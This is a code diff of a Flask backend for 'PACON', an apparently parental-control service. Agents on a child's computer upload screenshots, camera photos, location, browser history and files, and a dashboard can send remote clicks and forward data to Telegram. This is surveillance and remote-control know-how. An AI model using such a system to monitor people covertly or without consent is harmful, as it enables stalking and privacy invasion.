@@ -1,8 +1,20 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-PACON Service - v1.2.8
+PACON Service - v1.2.9
 =======================
+v1.2.9 changes:
+  - FIXED: /api/screenshots returns device_id / width / height
+           (from in-memory index, merged with filesystem scan).
+           This is what makes the dashboard's click coordinates
+           match the real child screen.
+  - FIXED: /api/control/screen-info/<id> returns real size even
+           when screen-info has not arrived yet (falls back to
+           last screenshot's width/height).
+  - NEW: /api/control/click-normalized (nx, ny in [0,1]).
+           Agent scales by its own GetSystemMetrics — DPI-proof.
+  - NEW: monitor/screen-info and monitor/screenshot persist
+           origin_x / origin_y / monitors[] / dpi_mode.
 v1.2.8 changes:
   - Bumped version to match Agent v1.2.8
 v1.2.7 changes:
@@ -62,8 +74,8 @@ SCREENSHOT_DIR = BASE_DIR / 'screenshots'
 LOGS_DIR       = BASE_DIR / 'logs'
 DATA_DIR       = BASE_DIR / 'data'
 CAMERA_DIR     = BASE_DIR / 'camera'
-FILES_DIR      = BASE_DIR / 'files'          # admin-uploaded
-RECEIVED_DIR   = BASE_DIR / 'received'       # ✅ v1.2.7
+FILES_DIR      = BASE_DIR / 'files'
+RECEIVED_DIR   = BASE_DIR / 'received'
 UPLOAD_DIR     = BASE_DIR / 'uploads'
 DEVICE_DIR     = BASE_DIR / 'devices'
 
@@ -101,12 +113,14 @@ AGENT_PIN  = os.environ.get('AGENT_PIN',  '').strip()
 if not PARENT_PIN:
     logger.warning("⚠️ PARENT_PIN not set — dashboard UNPROTECTED")
 elif not PARENT_PIN.isdigit() or len(PARENT_PIN) != 6:
-    logger.error("❌ PARENT_PIN must be exactly 6 digits"); PARENT_PIN = ""
+    logger.error("❌ PARENT_PIN must be exactly 6 digits")
+    PARENT_PIN = ""
 
 if not AGENT_PIN:
     logger.warning("⚠️ AGENT_PIN not set — agents UNPROTECTED")
 elif not AGENT_PIN.isdigit() or len(AGENT_PIN) != 6:
-    logger.error("❌ AGENT_PIN must be exactly 6 digits"); AGENT_PIN = ""
+    logger.error("❌ AGENT_PIN must be exactly 6 digits")
+    AGENT_PIN = ""
 
 sessions = {}
 SESSION_TTL    = 24 * 3600
@@ -119,8 +133,8 @@ LOGIN_WINDOW       = 300
 # FLASK APP
 # ============================================================
 app = Flask(__name__)
-app.config['JSON_SORT_KEYS'] = False
-app.config['MAX_CONTENT_LENGTH'] = 64 * 1024 * 1024  # ✅ v1.2.7: 64MB
+app.config['JSON_SORT_KEYS']     = False
+app.config['MAX_CONTENT_LENGTH'] = 64 * 1024 * 1024
 ALLOWED_ORIGINS = [
     'https://service-ur14.onrender.com',
     'http://localhost:5001',
@@ -153,14 +167,13 @@ fingerprint_lock    = threading.Lock()
 
 poll_counts         = defaultdict(int)
 
-# ✅ v1.2.7: received-files index
 received_files       = []
 received_files_lock  = threading.Lock()
 MAX_RECEIVED_FILE_MB    = 50
 MAX_RECEIVED_TOTAL_MB   = 500
 
-ping_thread  = None
-ping_running = False
+ping_thread   = None
+ping_running  = False
 ping_interval = 240
 
 OFFLINE_THRESHOLD = 15
@@ -190,6 +203,7 @@ def add_activity(action: str, details: str, device_id: str = "unknown"):
     if len(activities) > 500:
         activities[:] = activities[-500:]
 
+
 def safe_filename(name: str) -> str:
     import re
     name = os.path.basename(name or "")
@@ -198,16 +212,19 @@ def safe_filename(name: str) -> str:
         name = 'invalid'
     return name
 
+
 def _safe_eq(a: str, b: str) -> bool:
     try:
         return hmac.compare_digest(str(a).encode(), str(b).encode())
     except Exception:
         return False
 
+
 def _is_device_online(device_id: str, now: Optional[float] = None) -> bool:
     if now is None:
         now = time.time()
     return (now - control_devices.get(device_id, 0)) < OFFLINE_THRESHOLD
+
 
 def _device_age(device_id: str, now: Optional[float] = None) -> Optional[float]:
     if now is None:
@@ -225,8 +242,10 @@ def _fingerprint_for(hostname: str, public_ip: str) -> Optional[str]:
         return None
     return f"{(hostname or '').strip().lower()}|{(public_ip or '').strip()}"
 
+
 def _is_placeholder_id(did: str) -> bool:
     return bool(did) and (did.startswith("__") or did.endswith("__"))
+
 
 def _resolve_canonical_id(incoming_id: str,
                           hostname: str = "",
@@ -240,10 +259,8 @@ def _resolve_canonical_id(incoming_id: str,
     with fingerprint_lock:
         existing = device_fingerprint.get(fp)
         if existing and _is_placeholder_id(existing):
-            logger.info(
-                f"🧹 Replacing placeholder fingerprint "
-                f"{existing} → {incoming_id[:8]}"
-            )
+            logger.info(f"🧹 Replacing placeholder fingerprint "
+                        f"{existing} → {incoming_id[:8]}")
             device_fingerprint[fp] = incoming_id
             return incoming_id
         if existing and existing != incoming_id:
@@ -251,21 +268,18 @@ def _resolve_canonical_id(incoming_id: str,
             last_poll = control_devices.get(existing, 0)
             existing_age = now - last_poll if last_poll else None
             if existing_age is not None and existing_age < OFFLINE_THRESHOLD * 4:
-                logger.warning(
-                    f"🔀 Fingerprint collision: {incoming_id[:8]} → "
-                    f"reusing canonical {existing[:8]}"
-                )
+                logger.warning(f"🔀 Fingerprint collision: {incoming_id[:8]} → "
+                               f"reusing canonical {existing[:8]}")
                 return existing
             else:
-                logger.info(
-                    f"🔀 Canonical takeover: {existing[:8]} stale → "
-                    f"adopting {incoming_id[:8]}"
-                )
+                logger.info(f"🔀 Canonical takeover: {existing[:8]} stale → "
+                            f"adopting {incoming_id[:8]}")
                 device_fingerprint[fp] = incoming_id
                 return incoming_id
         else:
             device_fingerprint[fp] = incoming_id
             return incoming_id
+
 
 def _get_public_ip_from_request() -> str:
     xff = request.headers.get('X-Forwarded-For', '')
@@ -282,10 +296,12 @@ def _client_ip() -> str:
         return xff.split(',')[0].strip()
     return request.remote_addr or 'unknown'
 
+
 def _create_session() -> str:
     token = secrets.token_urlsafe(32)
     sessions[token] = {'ip': _client_ip(), 'created': time.time()}
     return token
+
 
 def _is_valid_session(token: str) -> bool:
     if not token:
@@ -298,17 +314,21 @@ def _is_valid_session(token: str) -> bool:
         return False
     return True
 
+
 def _check_login_rate(ip: str) -> bool:
     now = time.time()
     bucket = login_attempts[ip]
     bucket[:] = [t for t in bucket if now - t < LOGIN_WINDOW]
     return len(bucket) < MAX_LOGIN_ATTEMPTS
 
+
 def _record_login_attempt(ip: str):
     login_attempts[ip].append(time.time())
 
+
 def _clear_login_attempts(ip: str):
     login_attempts.pop(ip, None)
+
 
 def _server_token_from_request():
     h = request.headers.get('X-Server-Token')
@@ -318,6 +338,7 @@ def _server_token_from_request():
     if s:
         return s
     return request.args.get('token', '')
+
 
 def require_parent_auth(f):
     @wraps(f)
@@ -329,6 +350,7 @@ def require_parent_auth(f):
             return f(*args, **kwargs)
         return jsonify({'success': False, 'error': 'unauthorized'}), 401
     return wrapper
+
 
 def require_agent_auth(f):
     @wraps(f)
@@ -356,8 +378,9 @@ RATE_LIMITS = {
     'screenshot': (300, 60),
     'login':      (10, 300),
     'telegram':   (30, 60),
-    'upload':     (60, 60),   # ✅ v1.2.7
+    'upload':     (60, 60),
 }
+
 
 def rate_limit(category='default'):
     def deco(f):
@@ -390,19 +413,21 @@ def get_server_url():
         return 'https://service-ur14.onrender.com'
     return 'http://localhost:5001'
 
+
 def ping_server():
     global ping_running
     url = f"{get_server_url()}/api/health"
     while ping_running and not _stop_event.is_set():
         try:
             req = urllib.request.Request(url, method='GET')
-            req.add_header('User-Agent', 'PACON-SelfPing/1.2.8')
+            req.add_header('User-Agent', 'PACON-SelfPing/1.2.9')
             with urllib.request.urlopen(req, timeout=30) as response:
                 if response.status == 200:
                     logger.debug("✅ Self-ping OK")
         except Exception as e:
             logger.warning(f"⚠️ Self-ping failed: {e}")
         _stop_event.wait(ping_interval)
+
 
 def start_ping_system():
     global ping_thread, ping_running
@@ -426,6 +451,7 @@ telegram_config = {
     "notify_offline": True,
 }
 
+
 def _load_telegram_config():
     global telegram_config
     try:
@@ -436,6 +462,7 @@ def _load_telegram_config():
     except Exception as e:
         logger.warning(f"Telegram config load failed: {e}")
 
+
 def _save_telegram_config():
     try:
         with open(TELEGRAM_CONFIG_FILE, "w", encoding="utf-8") as f:
@@ -443,10 +470,13 @@ def _save_telegram_config():
     except Exception as e:
         logger.error(f"Telegram config save failed: {e}")
 
+
 _load_telegram_config()
+
 
 def _telegram_api_url(method: str) -> str:
     return f"https://api.telegram.org/bot{telegram_config['bot_token']}/{method}"
+
 
 def _telegram_send_message(text: str, parse_mode: str = "HTML") -> dict:
     if not telegram_config.get("enabled"):
@@ -484,6 +514,7 @@ def _telegram_send_message(text: str, parse_mode: str = "HTML") -> dict:
     except Exception as e:
         return {"success": False, "error": str(e)}
 
+
 def _telegram_upload(endpoint: str, field: str, filepath: Path, caption: str = "") -> dict:
     if not telegram_config.get("enabled"):
         return {"success": False, "error": "Telegram is disabled"}
@@ -498,7 +529,8 @@ def _telegram_upload(endpoint: str, field: str, filepath: Path, caption: str = "
         return {"success": False, "error": "File is empty"}
     if file_size > 50 * 1024 * 1024:
         return {"success": False,
-                "error": f"file too large for Telegram ({file_size//1024//1024}MB > 50MB)"}
+                "error": f"file too large for Telegram "
+                         f"({file_size // 1024 // 1024}MB > 50MB)"}
     if field == "photo" and file_size > 10 * 1024 * 1024:
         return _telegram_upload("sendDocument", "document", filepath, caption)
     try:
@@ -517,7 +549,10 @@ def _telegram_upload(endpoint: str, field: str, filepath: Path, caption: str = "
             parts.append(b'Content-Disposition: form-data; name="parse_mode"\r\n\r\n')
             parts.append(b"HTML\r\n")
         parts.append(f"--{boundary}\r\n".encode())
-        parts.append(f'Content-Disposition: form-data; name="{field}"; filename="{filepath.name}"\r\n'.encode())
+        parts.append(
+            f'Content-Disposition: form-data; name="{field}"; '
+            f'filename="{filepath.name}"\r\n'.encode()
+        )
         parts.append(f"Content-Type: {mime}\r\n\r\n".encode())
         with open(filepath, "rb") as f:
             parts.append(f.read())
@@ -545,8 +580,10 @@ def _telegram_upload(endpoint: str, field: str, filepath: Path, caption: str = "
     except Exception as e:
         return {"success": False, "error": str(e)}
 
+
 def _telegram_send_photo(filepath: Path, caption: str = "") -> dict:
     return _telegram_upload("sendPhoto", "photo", filepath, caption)
+
 
 def _telegram_send_document(filepath: Path, caption: str = "") -> dict:
     return _telegram_upload("sendDocument", "document", filepath, caption)
@@ -573,11 +610,13 @@ def _notify_state_change(device_id: str, is_online: bool):
         )
         logger.info(f"📲 Sent OFFLINE notification for {device_id[:8]}")
 
+
 def _mark_device_online(device_id: str):
     was_online = device_online_state.get(device_id)
     device_online_state[device_id] = True
     if was_online is False:
         _notify_state_change(device_id, True)
+
 
 def _purge_device_data(device_id: str):
     try:
@@ -606,6 +645,7 @@ def _purge_device_data(device_id: str):
     except Exception as e:
         logger.warning(f"Purge error for {device_id[:8]}: {e}")
 
+
 def _cleanup_pending_registrations():
     now = time.time()
     removed = []
@@ -625,7 +665,9 @@ def _cleanup_pending_registrations():
             device_online_state.pop(did, None)
             removed.append(did)
     if removed:
-        logger.info(f"🧹 Removed {len(removed)} pending device(s): {[d[:8] for d in removed]}")
+        logger.info(f"🧹 Removed {len(removed)} pending device(s): "
+                    f"{[d[:8] for d in removed]}")
+
 
 def _cleanup_orphans():
     global received_files
@@ -675,7 +717,6 @@ def _cleanup_orphans():
         logger.info(f"🧹 Orphan cleanup: removed {len(removed)} device(s): "
                     f"{[d[:8] for d in removed]}")
 
-    # ✅ v1.2.7: cap received-files total size
     with received_files_lock:
         total = sum(f['size'] for f in received_files)
         while total > MAX_RECEIVED_TOTAL_MB * 1024 * 1024 and received_files:
@@ -687,12 +728,14 @@ def _cleanup_orphans():
                 pass
             total -= oldest.get('size', 0)
 
+
 def _cleanup_command_results():
     now = time.time()
     stale = [cid for cid, r in command_results.items()
              if now - r.get('timestamp', 0) > RESULT_TTL]
     for cid in stale:
         command_results.pop(cid, None)
+
 
 def _device_watchdog():
     last_cleanup = time.time()
@@ -718,8 +761,10 @@ def _device_watchdog():
                         last = control_devices.get(did, 0)
                         if (time.time() - last) >= OFFLINE_THRESHOLD:
                             _purge_device_data(did)
-                    threading.Thread(target=_delayed_purge,
-                                     args=(device_id,), daemon=True).start()
+
+                    threading.Thread(
+                        target=_delayed_purge, args=(device_id,), daemon=True
+                    ).start()
 
             if now - last_cleanup > 30:
                 _cleanup_orphans()
@@ -729,7 +774,10 @@ def _device_watchdog():
         except Exception as e:
             logger.debug(f"Watchdog error: {e}")
 
+
 _watchdog_thread = None
+
+
 def start_watchdog():
     global _watchdog_thread
     if _watchdog_thread is None or not _watchdog_thread.is_alive():
@@ -750,7 +798,8 @@ def auth_login():
     if not PARENT_PIN:
         token = _create_session()
         resp = make_response(jsonify({'success': True, 'dev_mode': True}))
-        resp.set_cookie(SESSION_COOKIE, token, httponly=True, samesite='Lax', max_age=SESSION_TTL)
+        resp.set_cookie(SESSION_COOKIE, token, httponly=True,
+                        samesite='Lax', max_age=SESSION_TTL)
         return resp
     ip = _client_ip()
     if not _check_login_rate(ip):
@@ -777,6 +826,7 @@ def auth_login():
                     secure=IS_RENDER, max_age=SESSION_TTL)
     return resp
 
+
 @app.route('/api/auth/logout', methods=['POST'])
 def auth_logout():
     token = request.cookies.get(SESSION_COOKIE, '')
@@ -784,6 +834,7 @@ def auth_logout():
     resp = make_response(jsonify({'success': True}))
     resp.delete_cookie(SESSION_COOKIE)
     return resp
+
 
 @app.route('/api/auth/verify', methods=['GET'])
 def auth_verify():
@@ -794,12 +845,13 @@ def auth_verify():
         return jsonify({'success': True, 'valid': True})
     return jsonify({'success': False, 'valid': False}), 401
 
+
 @app.route('/api/auth/status', methods=['GET'])
 def auth_status():
     return jsonify({
-        'success':       True,
-        'requires_pin':  bool(PARENT_PIN),
-        'has_session':   _is_valid_session(request.cookies.get(SESSION_COOKIE, '')),
+        'success':      True,
+        'requires_pin': bool(PARENT_PIN),
+        'has_session':  _is_valid_session(request.cookies.get(SESSION_COOKIE, '')),
     })
 
 # ============================================================
@@ -812,12 +864,14 @@ def serve_index():
         return send_from_directory(str(WEB_DIR), 'index.html')
     return get_fallback_html()
 
+
 @app.route('/index.html')
 def serve_index_html():
     index_path = WEB_DIR / 'index.html'
     if index_path.exists():
         return send_from_directory(str(WEB_DIR), 'index.html')
     return get_fallback_html()
+
 
 @app.route('/<path:path>')
 def serve_static(path):
@@ -826,9 +880,12 @@ def serve_static(path):
         return send_from_directory(str(WEB_DIR), path)
     return jsonify({"error": "File not found"}), 404
 
+
 def get_fallback_html():
-    return '''<!DOCTYPE html><html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px;">
-    <h1>🛡️ PACON v1.2.8</h1><p>index.html not found in web/public/</p></body></html>'''
+    return ('<!DOCTYPE html><html><body style="background:#000;color:#0f0;'
+            'font-family:monospace;padding:20px;">'
+            '<h1>🛡️ PACON v1.2.9</h1>'
+            '<p>index.html not found in web/public/</p></body></html>')
 
 # ============================================================
 # HEALTH
@@ -842,7 +899,7 @@ def health_check():
         "success":          True,
         "service":          "PACON API",
         "status":           "running",
-        "version":          "1.2.8",
+        "version":          "1.2.9",
         "platform":         platform.system(),
         "devices":          len(devices),
         "online_agents":    online_agents,
@@ -865,12 +922,13 @@ def health_check():
 @require_agent_auth
 def agent_ping():
     return jsonify({
-        'success':     True,
-        'pong':        True,
-        'server_time': datetime.now().isoformat(),
-        'client_ip':   _client_ip(),
+        'success':      True,
+        'pong':         True,
+        'server_time':  datetime.now().isoformat(),
+        'client_ip':    _client_ip(),
         'agent_pin_ok': True,
     })
+
 
 @app.route('/api/debug/clear-preflight', methods=['POST'])
 @require_parent_auth
@@ -894,13 +952,14 @@ def clear_preflight():
     logger.info(f"🧹 Cleared preflight ghosts: {removed}")
     return jsonify({'success': True, 'removed': removed})
 
+
 @app.route('/api/debug/devices', methods=['GET'])
 @require_parent_auth
 def debug_devices():
     now = time.time()
     out = {}
     for did, info in devices.items():
-        age = _device_age(did, now)
+        age      = _device_age(did, now)
         pid_info = device_agent_pid.get(did, {})
         has_polled = did in control_devices
         out[did] = {
@@ -941,6 +1000,7 @@ def debug_devices():
         'apps_grace':        APPS_GRACE,
     })
 
+
 @app.route('/api/debug/apps-status', methods=['GET'])
 @require_parent_auth
 def debug_apps_status():
@@ -965,7 +1025,8 @@ def debug_apps_status():
             'reason': (
                 'ok' if would_serve
                 else 'never polled' if did not in control_devices
-                else f'offline for {int(age)}s (> {APPS_GRACE}s grace)' if age and age >= APPS_GRACE
+                else f'offline for {int(age)}s (> {APPS_GRACE}s grace)'
+                if age and age >= APPS_GRACE
                 else 'no apps reported yet'
             ),
         }
@@ -1017,6 +1078,7 @@ def get_status():
         "timestamp": datetime.now().isoformat(),
     })
 
+
 @app.route('/api/devices', methods=['GET'])
 @require_parent_auth
 def get_devices():
@@ -1061,6 +1123,7 @@ def get_devices():
 
     return jsonify({"success": True, "devices": enriched})
 
+
 @app.route('/api/device/<device_id>/stats', methods=['GET'])
 @require_parent_auth
 def device_stats(device_id):
@@ -1087,27 +1150,46 @@ def _add_cache_headers(resp, seconds: int = 2):
     resp.headers['Cache-Control'] = f'public, max-age={seconds}'
     return resp
 
+
 @app.route('/api/screenshots', methods=['GET'])
 @require_parent_auth
 def list_screenshots():
-    limit = request.args.get('limit', 50, type=int)
+    """
+    v1.2.9: merges filesystem scan with in-memory index so that
+    device_id / width / height are always present — this is what
+    lets the dashboard compute correct absolute click coordinates.
+    """
+    limit     = request.args.get('limit', 50, type=int)
     device_id = request.args.get('deviceId', '')
+
+    meta = {s['filename']: s for s in screenshots}
+
     all_shots = []
     for directory in [SCREENSHOT_DIR, UPLOAD_DIR]:
         for pattern in ('*.png', '*.jpg'):
             for file in directory.glob(pattern):
                 try:
-                    stat = file.stat()
-                    all_shots.append({
-                        'filename':  file.name,
-                        'timestamp': datetime.fromtimestamp(stat.st_mtime).isoformat(),
-                        'size':      stat.st_size,
-                        'url':       f'/api/screenshots/{file.name}',
-                    })
+                    st = file.stat()
+                    m  = meta.get(file.name, {})
+                    entry = {
+                        'filename':     file.name,
+                        'timestamp':    datetime.fromtimestamp(st.st_mtime).isoformat(),
+                        'size':         st.st_size,
+                        'url':          f'/api/screenshots/{file.name}',
+                        'device_id':    m.get('device_id'),
+                        'device_model': m.get('device_model'),
+                        'width':        m.get('width', 0),
+                        'height':       m.get('height', 0),
+                    }
+                    if device_id and entry['device_id'] != device_id:
+                        continue
+                    all_shots.append(entry)
                 except Exception:
                     pass
+
     all_shots.sort(key=lambda x: x['timestamp'], reverse=True)
     return jsonify(all_shots[:limit])
+
 
 @app.route('/api/screenshots/<filename>', methods=['GET'])
 def get_screenshot(filename):
@@ -1147,6 +1229,7 @@ def list_camera_photos():
     photos.sort(key=lambda x: x['timestamp'], reverse=True)
     return jsonify(photos[:limit])
 
+
 @app.route('/api/camera/photos/<filename>', methods=['GET'])
 def get_camera_photo(filename):
     if PARENT_PIN:
@@ -1167,7 +1250,7 @@ def get_camera_photo(filename):
 @app.route('/api/files/list', methods=['GET'])
 @require_parent_auth
 def list_files():
-    limit = request.args.get('limit', 100, type=int)
+    limit  = request.args.get('limit', 100, type=int)
     merged = []
 
     for file in FILES_DIR.glob('*'):
@@ -1210,7 +1293,7 @@ def _save_received_file(device_id: str, filename: str, raw: bytes,
     safe_name = safe_filename(filename or "file.bin")
     dev_dir   = RECEIVED_DIR / safe_dev
     dev_dir.mkdir(parents=True, exist_ok=True)
-    dest      = dev_dir / safe_name
+    dest = dev_dir / safe_name
     if dest.exists():
         stem, ext = os.path.splitext(safe_name)
         dest = dev_dir / f"{stem}_{int(time.time())}{ext}"
@@ -1234,6 +1317,7 @@ def _save_received_file(device_id: str, filename: str, raw: bytes,
             received_files[:] = received_files[-2000:]
     return entry
 
+
 @app.route('/api/monitor/file-upload', methods=['POST'])
 @require_agent_auth
 @rate_limit('upload')
@@ -1244,7 +1328,7 @@ def monitor_file_upload():
             or (request.json or {}).get('deviceId')
             or request.args.get('deviceId', 'unknown')
         )
-        hostname  = (
+        hostname = (
             request.form.get('deviceModel')
             or (request.json or {}).get('deviceModel')
             or ''
@@ -1277,7 +1361,8 @@ def monitor_file_upload():
         if size > MAX_RECEIVED_FILE_MB * 1024 * 1024:
             return jsonify({
                 'success': False,
-                'error': f'file too large ({size//1024//1024}MB > {MAX_RECEIVED_FILE_MB}MB)',
+                'error': f'file too large '
+                         f'({size // 1024 // 1024}MB > {MAX_RECEIVED_FILE_MB}MB)',
             }), 413
 
         entry = _save_received_file(device_id, filename, raw, source_path, mime)
@@ -1285,19 +1370,22 @@ def monitor_file_upload():
         if device_id in devices:
             devices[device_id]['last_seen'] = datetime.now().isoformat()
 
-        add_activity('file_received',
-                     f'{entry["filename"]} ({size//1024}KB) from {device_id[:8]}',
-                     device_id)
+        add_activity(
+            'file_received',
+            f'{entry["filename"]} ({size // 1024}KB) from {device_id[:8]}',
+            device_id,
+        )
         logger.info(f"📥 Received file {entry['filename']} "
-                    f"({size//1024}KB) from {device_id[:8]}")
+                    f"({size // 1024}KB) from {device_id[:8]}")
         return jsonify({
-            'success':  True,
-            'entry':    entry,
+            'success':   True,
+            'entry':     entry,
             'device_id': device_id,
         })
     except Exception as e:
         logger.error(f"file_upload error: {e}")
         return jsonify({'success': False, 'error': str(e)}), 500
+
 
 @app.route('/api/files/received', methods=['GET'])
 @require_parent_auth
@@ -1312,12 +1400,13 @@ def list_received_files():
     clean = [{k: v for k, v in f.items() if k != 'disk_path'} for f in items[:limit]]
     total_bytes = sum(f['size'] for f in items)
     return jsonify({
-        'success': True,
-        'files':   clean,
-        'count':   len(clean),
+        'success':     True,
+        'files':       clean,
+        'count':       len(clean),
         'total_bytes': total_bytes,
-        'total_mb': round(total_bytes / 1024 / 1024, 2),
+        'total_mb':    round(total_bytes / 1024 / 1024, 2),
     })
+
 
 @app.route('/api/files/received/<dev_folder>/<filename>', methods=['GET'])
 def download_received_file(dev_folder, filename):
@@ -1334,6 +1423,7 @@ def download_received_file(dev_folder, filename):
     mime = mimetypes.guess_type(str(filepath))[0] or 'application/octet-stream'
     return send_file(filepath, mimetype=mime, as_attachment=True,
                      download_name=filename)
+
 
 @app.route('/api/files/received/<dev_folder>/<filename>', methods=['DELETE'])
 @require_parent_auth
@@ -1355,6 +1445,7 @@ def delete_received_file(dev_folder, filename):
         ]
     logger.info(f"🗑️ Deleted received file {dev_folder}/{filename}")
     return jsonify({'success': True})
+
 
 @app.route('/api/activity', methods=['GET'])
 @require_parent_auth
@@ -1394,6 +1485,7 @@ def get_apps():
             result.extend(apps)
     return jsonify(result[:limit])
 
+
 @app.route('/api/apps/list', methods=['GET'])
 @require_parent_auth
 def apps_list():
@@ -1414,11 +1506,13 @@ def apps_list():
         print(f"   → REFUSED: device has never polled", flush=True)
         return jsonify([])
     if age is None or age > APPS_GRACE:
-        print(f"   → REFUSED: offline for {int(age)}s (> {APPS_GRACE}s grace)", flush=True)
+        print(f"   → REFUSED: offline for {int(age)}s (> {APPS_GRACE}s grace)",
+              flush=True)
         return jsonify([])
     apps = installed_apps.get(device_id, [])
     print(f"   → RETURNING {len(apps)} apps", flush=True)
     return jsonify(apps)
+
 
 @app.route('/api/apps/search', methods=['GET'])
 @require_parent_auth
@@ -1444,11 +1538,13 @@ def apps_search():
                or q in a.get('name', '').lower()]
     return jsonify(results[:20])
 
+
 @app.route('/api/locations', methods=['GET'])
 @require_parent_auth
 def get_locations():
     limit = request.args.get('limit', 50, type=int)
     return jsonify(locations[-limit:])
+
 
 @app.route('/api/user', methods=['GET'])
 @require_parent_auth
@@ -1475,6 +1571,7 @@ def get_user():
         })
     return jsonify({"success": True, "full_name": "Unknown"})
 
+
 @app.route('/api/system/info', methods=['GET'])
 @require_parent_auth
 def system_info():
@@ -1486,11 +1583,13 @@ def system_info():
         "is_render":      IS_RENDER,
     })
 
+
 @app.route('/api/browser', methods=['GET'])
 @require_parent_auth
 def get_browser():
     limit = request.args.get('limit', 50, type=int)
     return jsonify(browser_history[-limit:])
+
 
 @app.route('/api/start', methods=['POST'])
 @require_parent_auth
@@ -1498,11 +1597,13 @@ def start_monitoring():
     add_activity('start', 'Monitoring started')
     return jsonify({"success": True, "status": "started"})
 
+
 @app.route('/api/stop', methods=['POST'])
 @require_parent_auth
 def stop_monitoring():
     add_activity('stop', 'Monitoring stopped')
     return jsonify({"success": True, "status": "stopped"})
+
 
 @app.route('/api/debug/webdir', methods=['GET'])
 @require_parent_auth
@@ -1517,6 +1618,7 @@ def debug_webdir():
         })
     except Exception as e:
         return jsonify({"error": str(e)}), 500
+
 
 @app.route('/api/ping/status', methods=['GET'])
 @require_parent_auth
@@ -1534,7 +1636,7 @@ def ping_status():
 @require_agent_auth
 def monitor_user():
     try:
-        data = request.json or {}
+        data        = request.json or {}
         incoming_id = data.get('deviceId', 'unknown')
         pid         = data.get('pid')
         version     = data.get('agent_version', 'unknown')
@@ -1560,8 +1662,8 @@ def monitor_user():
             'first_seen': prev.get('first_seen') if prev else datetime.now().isoformat(),
         }
 
-        existing_first_seen = devices.get(device_id, {}).get('first_seen',
-                                datetime.now().isoformat())
+        existing_first_seen = devices.get(device_id, {}).get(
+            'first_seen', datetime.now().isoformat())
 
         devices[device_id] = {
             'id':              device_id,
@@ -1579,49 +1681,63 @@ def monitor_user():
             'status':          'active' if device_id in control_devices else 'pending',
         }
         add_activity('user_registered',
-                     f"{data.get('name','User')} from {data.get('deviceModel','Unknown')}",
+                     f"{data.get('name', 'User')} from {data.get('deviceModel', 'Unknown')}",
                      device_id)
         logger.info(f"✅ User registered: {data.get('name')} "
                     f"({data.get('deviceModel')}) pid={pid} v={version} "
                     f"id={device_id[:8]}")
         _mark_device_online(device_id)
         return jsonify({
-            "success": True,
-            "device_id": device_id,
+            "success":      True,
+            "device_id":    device_id,
             "canonical_id": device_id,
-            "was_merged": device_id != incoming_id,
+            "was_merged":   device_id != incoming_id,
         })
     except Exception as e:
         logger.error(f"User error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
+
 
 @app.route('/api/monitor/screenshot', methods=['POST'])
 @require_agent_auth
 @rate_limit('screenshot')
 def monitor_screenshot():
     try:
-        data = request.json or {}
-        filename   = safe_filename(data.get('filename',
-                        f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png'))
-        image_data = data.get('data')
+        data        = request.json or {}
+        filename    = safe_filename(data.get(
+            'filename',
+            f'screenshot_{datetime.now().strftime("%Y%m%d_%H%M%S")}.png',
+        ))
+        image_data  = data.get('data')
         incoming_id = data.get('deviceId', 'unknown')
-        width      = data.get('width', 0)
-        height     = data.get('height', 0)
-        hostname   = data.get('deviceModel', '')
-        public_ip  = _get_public_ip_from_request()
+        width       = data.get('width', 0)
+        height      = data.get('height', 0)
+        hostname    = data.get('deviceModel', '')
+        public_ip   = _get_public_ip_from_request()
 
         device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
 
         if not image_data:
             return jsonify({"success": False, "error": "No image data"}), 400
         image_bytes = base64.b64decode(image_data)
-        filepath = UPLOAD_DIR / filename
+        filepath    = UPLOAD_DIR / filename
         with open(filepath, 'wb') as f:
             f.write(image_bytes)
         if device_id in devices:
             devices[device_id]['last_seen'] = datetime.now().isoformat()
+
+        origin_x = int(data.get('origin_x', 0) or 0)
+        origin_y = int(data.get('origin_y', 0) or 0)
         if width > 0 and height > 0:
-            device_screens[device_id] = {'width': width, 'height': height}
+            device_screens[device_id] = {
+                'width':      width,
+                'height':     height,
+                'origin_x':   origin_x,
+                'origin_y':   origin_y,
+                'monitors':   data.get('monitors', []),
+                'density':    96,
+                'updated_at': datetime.now().isoformat(),
+            }
         screenshots.append({
             'filename':     filename,
             'device_id':    device_id,
@@ -1630,6 +1746,8 @@ def monitor_screenshot():
             'size':         filepath.stat().st_size,
             'width':        width,
             'height':       height,
+            'origin_x':     origin_x,
+            'origin_y':     origin_y,
             'url':          f'/api/screenshots/{filename}',
         })
         if len(screenshots) > 500:
@@ -1640,23 +1758,26 @@ def monitor_screenshot():
         logger.error(f"Screenshot error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
 
+
 @app.route('/api/monitor/camera', methods=['POST'])
 @require_agent_auth
 def monitor_camera():
     try:
-        data = request.json or {}
-        filename   = safe_filename(data.get('filename',
-                        f'camera_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg'))
-        image_data = data.get('data')
+        data        = request.json or {}
+        filename    = safe_filename(data.get(
+            'filename',
+            f'camera_{datetime.now().strftime("%Y%m%d_%H%M%S")}.jpg',
+        ))
+        image_data  = data.get('data')
         incoming_id = data.get('deviceId', 'unknown')
         hostname    = data.get('deviceModel', '')
         public_ip   = _get_public_ip_from_request()
-        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+        device_id   = _resolve_canonical_id(incoming_id, hostname, public_ip)
 
         if not image_data:
             return jsonify({"success": False, "error": "No image data"}), 400
         image_bytes = base64.b64decode(image_data)
-        filepath = UPLOAD_DIR / filename
+        filepath    = UPLOAD_DIR / filename
         with open(filepath, 'wb') as f:
             f.write(image_bytes)
         if device_id in devices:
@@ -1671,17 +1792,19 @@ def monitor_camera():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
+
 @app.route('/api/monitor/location', methods=['POST'])
 @require_agent_auth
 def monitor_location():
     try:
-        data = request.json or {}
+        data        = request.json or {}
         incoming_id = data.get('deviceId', 'unknown')
         hostname    = data.get('deviceModel', '')
         public_ip   = _get_public_ip_from_request()
-        device_id = _resolve_canonical_id(incoming_id, hostname, public_ip)
+        device_id   = _resolve_canonical_id(incoming_id, hostname, public_ip)
 
-        lat = data.get('latitude'); lon = data.get('longitude')
+        lat = data.get('latitude')
+        lon = data.get('longitude')
         if lat is None or lon is None:
             return jsonify({"success": False, "error": "No location"}), 400
         if device_id in devices:
@@ -1699,15 +1822,16 @@ def monitor_location():
